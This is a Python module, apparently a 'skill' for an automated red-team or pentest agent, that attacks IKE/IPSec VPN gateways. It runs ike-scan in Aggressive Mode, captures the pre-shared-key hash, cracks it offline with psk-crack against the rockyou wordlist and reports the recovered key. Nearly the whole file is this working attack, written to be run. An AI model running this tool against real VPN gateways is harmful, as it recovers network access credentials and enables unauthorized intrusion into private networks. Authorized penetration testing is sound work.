"""
Skill: ike_enum
Enumeración IKE/IPSec (VPN) y ataque a PSK en Aggressive Mode:

  1. ike-scan -A <target>                  → detecta IKE y Aggressive Mode
  2. ike-scan -A <target> --pskcrack=FILE  → extrae el hash PSK
  3. psk-crack -d <wordlist> FILE          → crackea el PSK por diccionario

Técnica característica de RedTeam Barranquilla (https://redteambq.co/).
Si ike-scan/psk-crack no están instalados, devuelve los comandos manuales.
"""
import subprocess
import shutil
import tempfile
import re
from pathlib import Path

META = {
    "name": "ike_enum",
    "category": "recon_activo",
    "description": (
        "Enumera IKE/IPSec (500/UDP) y ataca PSK en Aggressive Mode con ike-scan + "
        "psk-crack. Detecta identidad, extrae el hash PSK y lo crackea por diccionario."
    ),
    "args": ["target", "wordlist", "aggressive", "timeout"],
    "example": "SKILL:ike_enum target=10.10.11.87 wordlist=/usr/share/wordlists/rockyou.txt",
}

_WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz",
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
]


def _find_wordlist(explicit: str) -> str:
    if explicit and Path(explicit).exists():
        return explicit
    for w in _WORDLISTS:
        if Path(w).exists():
            return w
    return ""


def _run(cmd: list, timeout: int) -> tuple:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "[timeout]"
    except FileNotFoundError:
        return 127, "[not found]"
    except Exception as e:  # pragma: no cover
        return 1, f"[error] {e}"


def _manual(target: str, wordlist: str) -> dict:
    wl = wordlist or "/usr/share/wordlists/rockyou.txt"
    out = (
        "⚠️  ike-scan / psk-crack no instalados. Instala con:\n"
        "    sudo apt install ike-scan\n\n"
        "Comandos manuales (requieren privilegios de red):\n"
        f"  1) ⚠️ REQUIERE SUDO  sudo ike-scan -A {target}\n"
        f"  2) ⚠️ REQUIERE SUDO  sudo ike-scan -A {target} --pskcrack=psk.txt\n"
        f"  3) psk-crack -d {wl} psk.txt\n"
    )
    return {"success": False, "output": out, "findings": [
        {"type": "tool_missing", "value": "ike-scan", "severity": "info",
         "description": "Instala ike-scan para automatizar la enumeración IKE.",
         "source": "ike_enum"}]}


def run(**kwargs) -> dict:
    target = (kwargs.get("target") or "").strip()
    if not target:
        return {"success": False, "output": "Falta 'target' (IP del gateway VPN).", "findings": []}
    wordlist = _find_wordlist((kwargs.get("wordlist") or "").strip())
    timeout = int(kwargs.get("timeout", 60) or 60)

    if not shutil.which("ike-scan"):
        return _manual(target, wordlist)

    findings, lines = [], []

    # 1) Detección IKE Aggressive Mode
    rc, out1 = _run(["ike-scan", "-A", target], timeout)
    lines.append(f"$ ike-scan -A {target}\n{out1.strip()}")
    handshake = "Aggressive Mode Handshake returned" in out1 or "1 returned handshake" in out1
    if "0 returned handshake" in out1 and not handshake:
        lines.append("\nSin respuesta IKE en Aggressive Mode.")
        return {"success": True, "output": "\n".join(lines), "findings": [
            {"type": "ike_no_aggressive", "value": target, "severity": "info",
             "description": "No se obtuvo handshake IKE en Aggressive Mode.",
             "source": "ike_enum"}]}

    findings.append({"type": "ike_aggressive_mode", "value": target, "severity": "high",
                     "description": "Gateway IKE acepta Aggressive Mode (expone hash PSK).",
                     "source": "ike_enum"})
    # Identidad descubierta
    ident = re.search(r"ID\(.*?Name=([^,)\s]+)", out1)
    if ident:
        findings.append({"type": "ike_identity", "value": ident.group(1), "severity": "medium",
                         "description": f"Identidad IKE descubierta: {ident.group(1)}",
                         "source": "ike_enum"})

    # 2) Extracción del hash PSK
    psk_file = Path(tempfile.gettempdir()) / f"ike_psk_{target.replace('.', '_')}.txt"
    rc, out2 = _run(["ike-scan", "-A", target, f"--pskcrack={psk_file}"], timeout)
    if psk_file.exists() and psk_file.stat().st_size > 0:
        findings.append({"type": "psk_hash_captured", "value": str(psk_file), "severity": "high",
                         "description": "Hash PSK capturado para ataque offline.",
                         "source": "ike_enum"})
        lines.append(f"\n✓ Hash PSK → {psk_file}")

        # 3) Crackeo por diccionario
        if shutil.which("psk-crack") and wordlist:
            rc, out3 = _run(["psk-crack", "-d", wordlist, str(psk_file)], max(timeout, 120))
            lines.append(f"\n$ psk-crack -d {wordlist} {psk_file}\n{out3.strip()}")
            m = re.search(r'key \"([^\"]+)\"', out3) or re.search(r"cracked.*?:\s*(\S+)", out3, re.I)
            if m:
                findings.append({"type": "psk_cracked", "value": m.group(1), "severity": "critical",
                                 "description": f"PSK crackeado: {m.group(1)}",
                                 "source": "ike_enum"})
                lines.append(f"\n🔓 PSK CRACKEADO: {m.group(1)}")
        elif not wordlist:
            lines.append("\n⚠️ Sin wordlist (rockyou no encontrada). Pasa wordlist=/ruta.")
        else:
            lines.append("\n⚠️ psk-crack no instalado (viene con ike-scan).")
    else:
        lines.append("\nNo se pudo extraer el hash PSK.")

    return {"success": True, "output": "\n".join(lines), "findings": findings}
